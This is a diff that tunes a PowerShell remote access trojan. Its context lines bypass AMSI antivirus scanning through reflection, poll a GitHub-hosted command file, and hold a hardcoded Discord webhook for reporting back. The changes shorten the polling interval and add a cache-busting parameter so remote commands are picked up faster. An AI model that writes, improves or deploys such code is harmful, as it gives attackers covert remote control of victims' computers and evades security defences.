@@ -10,7 +10,7 @@ $R.GetField('ams'+'iContext','NonPublic,Static').SetValue($R,$null)
 $C='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'cmd.txt'
 $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
 $S=Join-Path $env:TEMP 'r_s.tmp'     # last-executed command state
-$script:P=30000                       # poll interval (ms)
+$script:P=10000                       # poll interval (ms)
 
 # ---- HTTP helpers ----
 function Post($text){
@@ -116,7 +116,7 @@ function Run-Cmd($c){
 Post '`[+] rat online`'
 while($true){
   try{
-    $remote=(New-Object Net.WebClient).DownloadString($C).Trim()
+    $remote=(New-Object Net.WebClient).DownloadString($C+"?cb="+[DateTime]::Now.Ticks).Trim()
     $last=Get-Content $S -Raw -EA SilentlyContinue
     if($remote -and $remote -ne $last){
       $remote | Set-Content $S -Force
